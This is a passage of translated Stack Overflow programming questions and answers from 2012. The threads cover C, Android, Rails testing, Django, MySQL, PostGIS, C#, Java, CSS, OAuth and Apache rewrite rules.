> 时间：2012-10-11T12:20:26.097

`struct stat_mot`需要在头文件中定义或者使用指针。

哦，（虽然这不是问题）

`typedef struct stat_mot;`

您需要像这样指定第二种类型的名称：

`typedef struct stat_mot stat_mot;`

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-10-12T03:11:15.833

也许你应该写这个

```
typedef struct stat_mot stat_mot; 
```

在你的 frequence.h 中，然后

```
typedef struct stat_mot {
    char * word;
    int frequency;
}; 
```

在 .c 文件中。

.h文件只是数据文件或方法的声明，但你应该清楚地声明它。

提示：不需要 ; 在 main(){} 的末尾；*

# c++ - tbb GettingStarted 示例未编译

> ID：12839315
> 
> 赞同：0
> 
> 时间：2012-10-11T12:15:58.747
> 
> 标签：c++, linux, redhat, tbb

我有 tbbvars.csh 文件的来源。我按照指导打开了示例目录`(/GettingStarted/sub_string_finder)`，然后运行 ​​make。不幸的是，我收到以下错误：

```
sub_string_finder.cpp:32:30: error: tbb/parallel_for.h: No such file or directory
sub_string_finder.cpp:33:31: error: tbb/blocked_range.h: No such file or directory
sub_string_finder.cpp:35: error: tbb is not a namespace-name 
```

有人有线索吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:22:30.137

您必须包含`tbb`目录来编译您的示例

# android - GS3上的屏幕密度

> ID：12839318
> 
> 赞同：0
> 
> 时间：2012-10-11T12:16:04.777
> 
> 标签：android, android-screen, android-screen-support

我不明白以下几点：

*   三星 Galaxy S3 显示 720 像素 x 1280 像素，屏幕尺寸为 4.8 英寸
*   所以屏幕密度可以评估到305dpi
*   在[Android screen-support recommandation page](http://developer.android.com/guide/practices/screens_support.html)中，305dpi 对应“xhdpi”限定符

所以我的问题是：**为什么在 GS3 上运行的应用程序会从“mdpi”限定符中获取资源？**

* * *

作为更新，请参阅我的代码来测试它：

**主.xml**：

```
<RelativeLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent" >

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:text="@string/density" />

</RelativeLayout> 
```

**文件夹中的strings.xml** {" **values** "," **values-ldpi** "," **values-mdpi** "," **values-hdpi** "," **values-xhdpi** "}

其中 " **[x]** " 分别是 {" **default** "," **ldpi** "," **mdpi** "," **hdpi** "," **xhdpi** "} ：

```
<resources>

    <string name="density">[x]</string>

</resources> 
```

结果是应用程序显示“ **mdpi** ”文本资源

* * *

作为一个新的更新，我测试了：

*   将“ **values-xhdpi** ”文件夹重命名为“ **values-normal-xhdpi** ”

结果：“ **xhdpi** ”

*   将“ **values-xhdpi** ”文件夹重命名为“ **values-normal-xhdpi** ”
*   将“ **values-hdpi** ”文件夹重命名为“ **values-normal-hdpi** ”

结果：“ **hdpi** ”

*   将“ **values-xhdpi** ”文件夹重命名为“ **values-normal-xhdpi** ”
*   将“ **values-hdpi** ”文件夹重命名为“ **values-normal-hdpi** ”
*   将“ **values-mdpi** ”文件夹重命名为“ **values-normal-mdpi** ”

结果：“ **mdpi** ”

*   将“ **values-xhdpi** ”文件夹重命名为“ **values-normal-xhdpi** ”
*   将“ **values-hdpi** ”文件夹重命名为“ **values-normal-hdpi** ”
*   将“ **values-mdpi** ”文件夹重命名为“ **values-normal-mdpi** ”
*   将“ **values-ldpi** ”文件夹重命名为“ **values-normal-ldpi** ”

结果：“ **mdpi** ”

我不明白结果，为什么系统选择资源的选择性较低（“mdpi”最小值）而不是选择性更高？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T17:30:52.173

我发现了我的错误：

我在 API 级别 3 下编译，并在我的清单中删除了属性 android:targetSdkVersion，因为它无法识别（错误：在包 'android' 中找不到属性 'targetSdkVersion' 的资源标识符）。在[支持的屏幕范围](http://developer.android.com/guide/practices/screens_support.html#range)部分，我们可以看到从 Android 1.6（API 级别 4）开始支持。

谢谢你的帮助

# ruby-on-rails - RSpec/Mongoid：期望改变嵌入式模型的数量

> ID：12839322
> 
> 赞同：8
> 
> 时间：2012-10-11T12:16:13.153
> 
> 标签：ruby-on-rails, rspec, mongoid

我有两个 Mongoid 模型：User 和 EmailAccounts。后者嵌入在 User 模型中。该配置应该没问题，因为它通常可以工作。现在我正在尝试为我的用户编辑表单编写一个集成测试，如下所示：

```
describe 'Add EmailAccount' do
  it 'Adds an email account', js: true do
    user = FactoryGirl.create(:user_without_email_accounts)
    visit edit_user_path(user)
    expect{
      click_link 'New Email Account'
      within '.nested-fields' do
        fill_in 'Account Name', with: 'New Email Account'
        fill_in 'Other Field', with: 'Other Data'
      end
      click_button 'Save'
    }.to change(EmailAccount, :count).by(1)
  end
end 
```

因为 EmailAccount 是一个嵌入式模型，所以计数的变化总是 0。我可以以任何类似的方式检查 EmailAccount 计数器的变化吗？还是我必须走不同的路？这也不起作用：

```
 }.to change(user.email_accounts, :count).by(1) 
```

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-02-05T12:22:14.137

我遇到了完全相同的问题，并设法通过使用此处发布的答案组合来解决它。

```
expect {
  #action 
}.to change { foo.reload.bars.count }.by(1) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T13:48:22.617

用新答案编辑：

我已经能够在我的 Mongoid 文档规范中使用这种语法：

```
expect {
  #action
}.to change { Model.count }.by(1) 
```

请注意，count 语句位于方括号内，并且不使用 :count 参数。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T19:08:48.547

尝试以下：

```
user.reload
}.to change(user.email_accounts, :count).by(1) 
```

# python - 移动切换在 Django 中不起作用？

> ID：12839326
> 
> 赞同：1
> 
> 时间：2012-10-11T12:16:25.057
> 
> 标签：python, django, django-settings, django-middleware

我有 django 项目，其中移动部分 settings.py 配置如下

```
MIDDLEWARE_CLASSES = (
                      'site_middleware.SetSiteFromHost',
                     )
SITE_ID = 1 
```

和 site_middleware.py ：

```
class SetSiteFromHost:

    def process_request(self, request):
        if mobileBrowser(request):
            if request.GET.get('server', False):

                request.session['server_mode'] = True
                site = 1
            elif request.session.get('server_mode') == True:

                site = 1
            else:

                request.session['server_mode'] = False
                site = 2

        else:
            site = 1
        settings.SITE_ID = site 
```

错误未显示，但切换不起作用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:23:51.623

来自文档：[在运行时更改设置](https://docs.djangoproject.com/en/1.0/topics/settings/#altering-settings-at-runtime)。

您不应在运行时更改应用程序中的设置。

```
from django.conf import settings

settings.DEBUG = True   # Don't do this! 
```

您应该分配给设置的唯一位置是在设置文件中。

我认为最好的方法是制作几个设置文件：

文件`base_settings.py`：

```
 ... all your settings for all sites ... 
```

文件`first_site_settings.py`：

```
from base_settings import *

SITE_ID = 1

... other settings for this site ... 
```

文件`second_site_settings.py`：

```
from base_settings import *

SITE_ID = 2

... other settings for this site ... 
```

并将每个站点作为单独的 djano 进程运行：

```
$ python mysite/manage.py runserver --settings=mysite.first_site_settings
$ python mysite/manage.py runserver --settings=mysite.second_site_settings 
```

# mysql - 我可以设置一个条件来过滤我的 COUNT 子句吗？mysql

> ID：12839327
> 
> 赞同：1
> 
> 时间：2012-10-11T12:16:26.727
> 
> 标签：mysql, database, select, count, conditional-statements

我将仅解释与问题相关的内容，并省略任何其他不相关的细节。

**现在的情况：**

我有两张桌子，硬币和用户。

**`coin`**有三个字段`id, uid, fid.` 用户（已经在系统中注册并且可以邀请朋友）和他们的朋友（已经接受邀请并且成为会员）之间的硬币表。-该表仅存储被邀请后的成功注册-

**`id`**是唯一索引。
**`uid`**是存储用户ID。
**`fid`**是存储好友id（接受邀请并成为系统成员的好友）。

**`users`**具有有关用户的常用信息，例如`id, fname, lname, email`...etc 和`date_create`

**目标：** 找出发出最多邀请的**获奖者。**换句话说。查找邀请次数最多的顶级用户及其被邀请的朋友必须在 2012-08-31 之前注册。日期存储在表“用户”列 date_create 中。日期格式为 yyyy-mm-dd

例子-

```
Table coin

    id uid fid 
    1  333 777   
    2  444 888       
    3  555 999       
    4  333 123         
    5  444 456         
    6  333 789   

Table users
    id   date_create
    333  2012-07-15
    444  2012-07-20
    555  2012-07-25
    777  2012-07-25
    888  2012-07-25
    999  2012-10-02   <-- I don't need this to be counted
    123  2012-07-25
    456  2012-07-25
    789  2012-07-25 
```

表示用户 333 的邀请数量最多（邀请了 3 个用户）-> 777,123 和 789，用户 444 邀请了 2 个用户，用户 555 只邀请了 1 个用户，但对于 555，由于他的朋友（999）在 2012 年之后注册，因此不会被计算在内-08-31

我想要的是用户

```
333 has made 3 invitations before 2012-08-31\. 
444 has made 2 invitations before 2012-08-31. 
```

到目前为止我所做的是：[完全不确定]

```
SELECT
  c.uid,       
  u.fname,
  u.lname,
  u.phone,
  u.email,
  u.country,
  COUNT(c.fid)    AS NoOfFriends
FROM coin AS c
  JOIN users AS u
    ON c.uid = u.id
GROUP BY c.uid
ORDER BY NoOfFriends desc 
```

无论他/她的朋友何时注册，此查询都会（据我所知）带来最多邀请的用户。

所以我的问题是： **Q1）如何将日期条件应用到我的查询中？**

我想要拥有最多好友邀请的用户。他/她邀请的朋友必须在2012-08-31之前接受邀请并注册。在该日期之后任何其他接受的邀请都不应计算在内。

请为我提供代码示例。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:18:24.367

您可以`SUM`结合使用`CASE`：

```
SUM(CASE WHEN <cond> THEN 1 ELSE 0 END) as NoOfFriends 
```

完整的语句看起来像这样：

```
SELECT
  c.uid,
  u.fname,
  u.lname,
  u.phone,
  u.email,
  u.country,
  u.`date_create`,
  SUM(CASE WHEN f.date_create < 2012-10-31 THEN 1 ELSE 0 END)    AS NoOfFriends
FROM coin AS c
  JOIN users AS u
    ON c.uid = u.id
  join users as f
    on c.fid = f.id
GROUP BY c.uid, u.fname, u.lname, u.phone, u.email, u.country, u.`date_create`
ORDER BY NoOfFriends desc 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T12:30:50.493

许多答案使实际用户与受邀朋友混淆。

```
SELECT
    c.uid
info.fname,
info.lname,
info.phone,
info.email,
info.country,
info.date_create,
    COUNT(c.fid) AS [NoOfFriends]
FROM coin AS c
    JOIN users AS friend
        ON c.fid = friend.id
    LEFT JOIN users AS info
        ON c.uid = info.id
WHERE friend.date_create < '20121031'
GROUP BY c.uid 
```

**编辑**修复了数据格式

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:34:54.960

您仅分组依据的方法`c.uid`将在 MySQL 中工作，但您将无法使用其他 RDBMS。

在这种情况下，我会将计数移至子查询，在我看来它更易于阅读，并且它很好地将查询与您希望应用的逻辑分开，即获取朋友在某个日期之前注册的所有邀请，然后加入回邀请他们的用户。

```
SELECT  u.ID,
        u.fname,
        u.lname,
        u.phone,
        u.email,
        u.country,
        u.`date_create`,
        COALESCE(FriendCount, 0) AS FriendCount
        COALESCE(FriendCount2, 0) AS FriendCount2
FROM    users AS u
        LEFT JOIN  
        (   SELECT  coin.UID,
                    COUNT(coind.fid) AS FriendCount,
                    COUNT(CASE WHEN Users.Date_Create < '20121031' THEN coind.fid END) AS FriendCount2
            FROM    coin
                    INNER JOIN Users
                        ON coin.FID = users.ID
            GROUP BY coin.UID
        ) c
            ON c.uid = u.id
ORDER BY FriendCount2 DESC 
```

如果您不关心朋友总数，而只关心 10 月 31 日之前的朋友，那么您可以将其简化为

```
SELECT  u.ID,
        u.fname,
        u.lname,
        u.phone,
        u.email,
        u.country,
        u.`date_create`,
        COALESCE(FriendCount, 0) AS FriendCount
FROM    users AS u
        LEFT JOIN  
        (   SELECT  coin.UID,
                    COUNT(coind.fid) AS FriendCount
            FROM    coin
                    INNER JOIN Users
                        ON coin.FID = users.ID
            WHERE   Users.Date_Create < '20121031'
            GROUP BY coin.UID
        ) c
            ON c.uid = u.id
ORDER BY FriendCount DESC 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T12:37:50.333

该`count(expression)`函数计算该表达式的结果不为空的行。如果表达式只返回 true 或 false，所有行都将被计算在内，因为 true 和 false 都不为空。

要使用带有 count 的表达式，您必须使其在 false 时返回 null：

```
 COUNT(friend.date_create < '2012-10-31' or null) AS NoOfFriends 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-12T10:27:39.250

这是我的回答，感谢所有尝试和帮助的人，特别是快速提供实际解决方案的 LastCoder。

```
SELECT
  c.uid,
  info.id,
  info.fname,
  info.lname,
  info.phone,
  info.email,
  info.country,
  COUNT(DISTINCT c.fid) AS NoOfFriends   -- modified this to get unique invitations
FROM coin c
  JOIN users AS friends
    ON c.fid = friends.id
  LEFT JOIN users AS info
    ON c.uid = info.id
WHERE friends.date_create < '20120831'
GROUP BY c.uid
ORDER BY NoOfFriends DESC
LIMIT 10 
```

老实说，我没有使用其他解决方案，因为我 `SUM(CASE WHEN ...)`不清楚。

# postgresql - PostGIS：通过 GPS 点同步时间码

> ID：12839331
> 
> 赞同：0
> 
> 时间：2012-10-11T12:16:44.307
> 
> 标签：postgresql, distance, latitude-longitude, postgis, geo

我有几条同一路线的视频轨道，全年在不同场合拍摄。所有视频轨道都带有 1Hz GPS 的 GPS 标记，所以我有所有镜头的逐秒 GPS 点。

我想要完成的是将所有这些视频轨道放入例如 After Effects 中，并通过 GPS 位置重新映射时间。我无法按时间同步轨道，因为路线包括红绿灯和其他障碍物。

我已经开始创建两张表格：一张称为summer，它是主要的视频轨道，一张称为shot，它包含所有其他表格。

夏季餐桌是这样的：

```
 Column   |          Type          |                             Modifiers                              | Storage | Description 
-----------+------------------------+--------------------------------------------------------------------+---------+-------------
 id        | integer                | not null default nextval('summer_id_seq'::regclass) | plain   | 
 timecode  | time without time zone | not null                                                           | plain   | 
 spring_id | integer                |                                                                    | plain   | 
 autumn_id | integer                |                                                                    | plain   | 
 winter_id | integer                |                                                                    | plain   | 
 point     | geometry(Point,4326)   | not null                                                           | main    | 

Indexes:
    "summer_pkey" PRIMARY KEY, btree (id)
    "summer_autumn_id" btree (autumn_id)
    "summer_point_id" gist (point)
    "summer_spring_id" btree (spring_id)
    "summer_winter_id" btree (winter_id)
Foreign-key constraints:
    "summer_autumn_id_fkey" FOREIGN KEY (autumn_id) REFERENCES shot(id) DEFERRABLE INITIALLY DEFERRED
    "summer_spring_id_fkey" FOREIGN KEY (spring_id) REFERENCES shot(id) DEFERRABLE INITIALLY DEFERRED
    "summer_winter_id_fkey" FOREIGN KEY (winter_id) REFERENCES shot(id) DEFERRABLE INITIALLY DEFERRED
Has OIDs: no 
```

虽然镜头表看起来像这样：

```
 Column  |          Type          |                             Modifiers                             | Storage  | Description 
----------+------------------------+-------------------------------------------------------------------+----------+-------------
 id       | integer                | not null default nextval('shot_id_seq'::regclass) | plain    | 
 season   | character varying(255) | not null                                                          | extended | 
 timecode | time without time zone | not null                                                          | plain    | 
 point    | geometry(Point,4326)   | not null                                                          | main     | 

Indexes:
    "shot_pkey" PRIMARY KEY, btree (id)
    "shot_point_id" gist (point)
Referenced by:
    TABLE "summer" CONSTRAINT "summer_autumn_id_fkey" FOREIGN KEY (autumn_id) REFERENCES shot(id) DEFERRABLE INITIALLY DEFERRED
    TABLE "summer" CONSTRAINT "summer_spring_id_fkey" FOREIGN KEY (spring_id) REFERENCES shot(id) DEFERRABLE INITIALLY DEFERRED
    TABLE "summer" CONSTRAINT "summer_winter_id_fkey" FOREIGN KEY (winter_id) REFERENCES shot(id) DEFERRABLE INITIALLY DEFERRED
Has OIDs: no 
```

所以，基本上我想要做的是遍历夏季表中的所有行，为每个不同的拍摄找到最接近每一行的点，并使用此信息更新夏季表。

我整理了一个我个人不明白为什么不起作用的查询，但是输出很奇怪，并且在 After Effects 中进行时间重新映射时根本不起作用：

```
SELECT DISTINCT ON (summer.id)
   summer.id AS summer_id, shot.id AS autumn_id,
   ST_Distance_Sphere(summer.point, shot.point) AS distance
FROM shot.summer summer
   LEFT JOIN shot.shot.track
     ON ST_DFullyWithin (summer.point, shot.point, 0.001)
     AND shot.season='autumn'
ORDER BY summer.id ASC; 
```

有人可以指出我正确的方向吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-23T08:14:17.067

只是我的猜测（也许您可以详细说明“输出很奇怪”？）

您使用的是地理坐标，那么 0.001 的半径是一个相当大的距离（南北约 100 m，东西方向较小，取决于您向北的距离）然后您可能会在两者中获得很多匹配的命中表。据我了解，每个“秋点”都需要一个“夏点”——你只需要选择最近的点。此外，我会将数据重新投影到具有相同 x 和 y 分辨率的投影中（例如 utm，除非您覆盖的东西距离太大）如果我在北纬 60 度左右，使用地理投影，a ~ 110米的南北距离产生 0.001 度的数值差异，而约 55 米的东西距离产生相同的数值差异。即对于计算，向东 55 米的误差与向北的 110 米误差相同......

希望这为您指明了正确的方向。

# c# - 在 C# 中连接到外部 SQL 数据库

> ID：12839337
> 
> 赞同：6
> 
> 时间：2012-10-11T12:17:11.780
> 
> 标签：c#, mysql, sql, .net

我在外部服务器上设置了 SQL 服务器和数据库（为此，我们将域名称为“hello.com”），我想通过 C# 程序连接到该服务器。到目前为止，我有这个（所有服务器/数据库细节都与真实的不同）：

```
private static void SetupSQL()
{
    string connectionString = "server=hello.com; database=db1; uid=user1; pwd=xxxxx;";
    connection = new SqlConnection();
    connection.ConnectionString = connectionString;
    try
    {
        connection.Open();
        Console.WriteLine("Connected");
    }
    catch (Exception e)
    {
        Console.WriteLine(e.Message.ToString());
    }
} 
```

这给了我一条错误消息：

```
A network-related or instance-specific error occurred while establishing a connection to SQL Server. The server was not found or was not accessible. Verify that the instance name is correct and that SQL Server is configured to allow remote connections. (provider: Named Pipes Provider, error: 40 - Could not open a connection to SQL Server) 
```

我已经检查了所有连接字符串，并且我被允许远程访问，因为我现在在同一台计算机上打开 SQLWorkbench 查询数据库。

有任何想法吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-11T12:22:42.790

您将需要`MySQL`驱动程序：

[http://dev.mysql.com/downloads/connector/net/](http://dev.mysql.com/downloads/connector/net/)

然后可以使用`MySqlConnection`连接类进行连接。

```
MySqlConnection connection = new MySqlConnection(connectionString); 
```

[http://www.codeproject.com/Articles/43438/Connect-C-to-MySQL](http://www.codeproject.com/Articles/43438/Connect-C-to-MySQL)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-11T12:24:20.773

You can't use `SqlConnection` object to connect to MySQL database, you should use `MySqlConnection` instead after you import its dll

# caching - 在 Cherokee 中缓存动态 REST 内容

> ID：12839341
> 
> 赞同：0
> 
> 时间：2012-10-11T12:17:26.320
> 
> 标签：caching, php, cherokee, restler

我正在使用 Cherokee + PHP-FPM + MySQL 为移动应用程序开发后端服务器。我正在使用 Luracast Restler 2 提供一个 RESTful API。如何缓存动态内容，例如，一旦客户端通过 REST API 请求了一个项目列表，这个列表（以 JSON 格式）就会被缓存起来客户端请求直到内容有效期设置为过期？所有客户端的全局缓存机制？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T06:34:32.390

Restler 3 最终版本将在框架本身中内置服务器端缓存支持。目前你必须在 api 方法中自己实现它

# java - 尝试捕捉错误

> ID：12839344
> 
> 赞同：0
> 
> 时间：2012-10-11T12:17:34.370
> 
> 标签：java, exception, try-catch

我在我的 catch 语句中得到了红色下划线，不确定我得到的错误是“从不在相应的 try 语句的正文中抛出”这是什么意思？在我看来一切都很好。

```
public void validateTriangle(int sidea, int sideb, int sidec) throws InvalidValueException {
    try {
        if ((sidea + sideb > sidec) || (sideb + sidec > sidea) || (sidea + sidec > sideb)) {
            findArea(side1, side2, side3);
        }
    } catch (InvalidValueException excep) {
        message = excep.getMessage();
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-11T12:19:47.187

*“从不在相应的 try 语句的主体中抛出”的*意思正是它所说的：您已经告诉代码捕获一个`InvalidValueException`，但`try`块内的任何代码都没有抛出它。显然`findArea`不会抛出该异常（显然您的内联代码不会）。

[`try/catch`块](http://docs.oracle.com/javase/specs/jls/se7/html/jls-14.html#jls-14.20)用于捕获块内发生的异常并`try`处理它们（在相应的`catch`块中），因此对于`catch`在`try`. IDE（我相信编译器工具的 lint 功能`java`）会在捕获不会发生的错误可能是逻辑错误的基础上为您标记。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:20:03.897

在 try 块中运行的代码永远不会抛出`InvalidValueException`. 这就是他要告诉你的。

catch 块是不必要的

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:21:22.873

你得到这个红线/编译时错误作为你的方法

```
throws InvalidValueException 
```

这意味着您的方法不会处理此异常，它将被传递给调用者方法。所以在这种情况下，catch 块永远不会被执行。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T12:21:57.857

`findArea`明确检查`throws InvalidValueException`

```
... findArea(...) throws InvalidValueException {
   ...
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-11T12:24:11.557

方法`This exception is never thrown from the try`

所以删除你的`try-catch block`

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2012-10-11T12:20:01.667

你的`try-catch`覆盖你的`throws InvalidValueException` 你应该删除你的`try-catch`，或者删除你的`throws InvalidValueException`。

# html - 元素超出 元素

> ID：12839345
> 
> 赞同：0
> 
> 时间：2012-10-11T12:17:35.090
> 
> 标签：html, css, text-align, justify

![http://i.stack.imgur.com/ysNQV.jpg](../Images/24954f8dd2dc78cd74a8bb004a2991ad.png)

在上面的附件中，最后一个跨度（最后一个词-“for”）有问题；它实际上超出了我的灰色区域（这实际上是带有类文本框的 div 标签）。

我真的没有得到问题。html代码也如下所示。显示的边界`<span>`是因为我只是想问一下，两者之间存在一些差距`<span>`，这是导致最后一个单词问题的原因吗？那么如何缩小这个差距呢？

```
<div style="left:0pt; top:0pt; width:612pt; height:792pt; position:absolute;" class="page">
      <div style="left:103.2pt; top:189pt; width:396pt; height:156pt; position:absolute; background-color:rgb(191,191,191); overflow:hidden; border:0px Solid rgb(0,0,0);" class="textFrame">
        <p style="text-align: justify; padding-top: 0pt; padding-bottom: 0pt;">
          <span class="ln" style="height: 14.4pt; width: 396pt;">
            <span style="font-size: 12pt; font-family: F0; word-spacing: 45.9943pt; width: 197.802pt; letter-spacing: 0em; text-align: left; color: rgb(0, 0, 0); border: 0.1px solid red; display: inline-block;">Subject to the</span>
            <span style="font-size: 24pt; font-family: F0; width: 64.9904pt; letter-spacing: 0em; text-align: left; color: rgb(0, 0, 0); border: 0.1px solid green; display: inline-block;">license</span>
            <span style="font-size: 12pt; font-family: F0; word-spacing: 45.9943pt; width: 133.208pt; letter-spacing: 0em; text-align: right; color: rgb(0, 0, 0); border: 0.1px solid gold; display: inline-block;">terms for</span>
          </span>
        </p>
      </div>
    </div> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-11T12:28:28.673

您为此`white-space: nowrap;`设置`span.ln`的内容将在内容到达其父元素的末尾时停止包装。除非父项已设置，否则它将突出于父项`overflow: hidden;`，在这种情况下，文本将被遮挡。删除`white-space: nowrap;`规则以允许跨度换行。您可能还会遇到奇怪的布局问题，因为内部跨度是`display: inline-block;`这意味着它们在某些内联内容中显示为块元素，您可能也想删除它。

除非跨度实际上在源中彼此相邻，否则任何空白都将呈现为它们之间的空间，而它们要么`display: inline;`是跨度元素的默认显示，要么是`display: inline-block;`在本示例中设置的内部跨度（样式为在元素的样式属性中可见）。要使用`display: inline-block;`set 消除元素之间的空间，您需要删除源中跨度之间的空白（空格、制表符和换行符）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-07-20T22:51:50.277

就我个人而言，对我有用的东西，我给了父元素一个“自动换行：断词”，并为子跨度元素指定了宽度。

# php - 通过 Twitter 或 LinkedIn OAuth 登录用户而不打开弹出窗口

> ID：12839348
> 
> 赞同：1
> 
> 时间：2012-10-11T12:17:50.260
> 
> 标签：php, api, twitter, linkedin

我已经通过他们的 OAuth API 实现了 Twitter 的登录。我决定使用授权/身份验证弹出窗口，当进程结束时它会自行关闭。

然而，我真的很烦，一旦用户已经**授权**了我的应用程序，并且他也通过 Twitter 进行了**身份验证，弹出窗口将简单地打开和关闭。**我想避免完全创建弹出窗口，但另一种选择是重定向主页以进行身份​​验证，我再次想避免这种情况，因为它对 Twitter 和返回我的网站有闪烁效果。

我要问的是，是否可以通过 AJAX 或任何其他不需要无意义的打开关闭弹出窗口或使用 Twitter 来回闪烁屏幕的选项来验证用户身份？

Facebook 通过他们的 JS API 和 Ajax 来做到这一点，但我要求一个服务器到服务器的解决方案（我认为 Twitter 无论如何都禁止客户端的 OAuth）。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T14:58:33.223

对于 LinkedIn，如果您使用的是 REST API，您可以[将用户发送到身份验证端点](https://developer.linkedin.com/blog/oauth-now-authentication)：

```
https://www.linkedin.com/uas/oauth/authenticate 
```

如果他们仍然登录并且他们的 OAuth 令牌仍然有效，他们将看不到任何东西。

# html - 在较大的计算机上查看我的网站上的所有内容时如何放大？

> ID：12839349
> 
> 赞同：0
> 
> 时间：2012-10-11T12:17:53.043
> 
> 标签：html, css, view, dreamweaver

我正在制作一个单页网站，并希望获得与此 kenzo 网站类似的结果：

[http://www.kenzo.com](http://www.kenzo.com)

令人惊讶的是，中心的盒子在小屏幕电脑上更小，但在大屏幕电脑上却大得多。你是怎样做的？

我在想 CSS 样式中的“定位”可能会奏效，所以我尝试设置 left:0% 和 right:0%。但我发现它只是让图像居中，在大屏幕电脑上没有放大。

任何人有任何想法来解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:31:00.277

我检查了 kenzo.com 的代码：他们使用 JavaScript（和 jQuery）来获得这种效果。就像是：

```
$(window).resize(function(){
    $('.content').css('width', $(this).width()/2);
}); 
```

但这不是必需的，我什至认为这是不好的做法。

您宁愿`media queries`为不同的视口或屏幕分辨率使用不同的 css 样式。看看这篇非常有用的文章：

[MSN：CSS 媒体查询](https://developer.mozilla.org/en-US/docs/CSS/Media_queries)

[Smashing Magazine：如何使用 CSS3 媒体查询...](http://mobile.smashingmagazine.com/2010/07/19/how-to-use-css3-media-queries-to-create-a-mobile-version-of-your-website/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:24:07.190

无论如何，这里是样本。核实。在演示中重新调整结果部分的大小以查看效果

HTML

```
<div class="wrapper">
<header></header>
<div class="content"><img src="http://4.bp.blogspot.com/-yAOYE3-J1mo/TmsnBJ6ucYI/AAAAAAAABcA/5ZKqEv3p-6I/s1600/36676-sky_blue.jpg" /></div>
<footer>footer</footer>
</div>​ 
```

CSS

```
body{margin:0; padding:0}
.wrapper{width:100%;}
header{height:60px; background:green}
.content{position:relative; padding:30px; background:grey; }
.content img{max-width:100%}
footer{height:40px; background:red; }​ 
```

[**现场演示**](http://jsfiddle.net/7Hrme/)

# wordpress - htaccess 重定向到子文件夹有异常

> ID：12839359
> 
> 赞同：0
> 
> 时间：2012-10-11T12:18:31.517
> 
> 标签：wordpress, apache, .htaccess

我已经搜索了很多但没有找到解决方案。

我有一个 wordpress 博客`/_wp`和其他东西`/other`

我想要的是每个请求都被重定向到 WordPress。除了那些 to`/other`及其子目录。我还希望重写博客的访问权限。几个例子可以清楚地说明：

```
/ --> /_wp/

/ablogpost --> /_wp/ablogpost

/other --> /other

/other/bingou --> /other/bingou 
```

我已经尝试了一些事情，但对我来说最合乎逻辑的是：

*   不要触摸 /_wp/ 和 /other/ 的 .htaccess

*   通过添加以下内容来编辑根“/”的 .htaccess：

    ```
    RewriteEngine on
    RewriteCond %{HTTP_HOST} ^(www.)?mywebsite.com$
    RewriteCond %{REQUEST_URI} !^(/other|/other/.*)$
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^/?(.*)$ /_wp/$1 
    ```

如果你能告诉我那里出了什么问题，那就太好了！

# 编辑

更改索引后，子文件夹仍然无法在这里工作是我当时的 .htaccess ：

```
IndexIgnore .htaccess */.??* *~ *# */HEADER* */README* */_vti*
<Limit GET POST>
   order deny,allow
   deny from all
   allow from all
</Limit>
<Limit PUT DELETE>
   order deny,allow
   deny from all
</Limit>
AuthName site.com
# BEGIN WordPress
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    RewriteRule ^index\.php$ - [L]
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule . /index.php [L]
</IfModule>
# END WordPress 
```

# 编辑 2

最后，这是一个主机问题，但感谢您的帮助！你的回答效果很好

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:32:08.467

你应该遵循这个：[http ://codex.wordpress.org/Giving_WordPress_Its_Own_Directory](http://codex.wordpress.org/Giving_WordPress_Its_Own_Directory)

你的 wordpress 安装已经在它自己的目录中，所以你只需要：

**复制`/_wp/.htaccess`到`/.htaccess`**

**复制`/_wp/index.php`到`/index.php`**

**编辑`/index.php`：**

`require('./_wp/wp-blog-header.php');`

**编辑`/.htaccess`**

```
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L] 
```

# spring-mvc - 如何使用 Spring、Spring-JS 和 DOJO (dijit) 制作所需的单选按钮

> ID：12839367
> 
> 赞同：0
> 
> 时间：2012-10-11T12:19:02.850
> 
> 标签：spring-mvc, dojo, spring-webflow, spring-js

如何使用 Spring、Spring-JS 和 DOJO (dijit) 制作所需的单选按钮。我有以下输入表单，我正在尝试找出如何像其他字段一样制作所需的单选按钮。

```
